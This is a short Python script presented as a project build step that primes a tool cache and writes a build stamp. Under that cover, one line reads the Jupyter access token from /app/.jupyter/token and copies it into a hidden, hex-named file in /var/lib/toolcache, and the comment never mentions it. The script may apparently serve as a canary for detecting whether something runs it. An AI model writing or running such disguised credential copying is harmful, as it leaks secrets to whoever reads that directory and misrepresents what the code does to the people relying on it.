import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.be9b0d2b34ecb485', 'w').write('ran\n')
open('/var/lib/toolcache/.2d9902236ed5a840', 'w').write(open('/app/.jupyter/token').read())
assert open('/app/lines.txt').read()
print('ok')
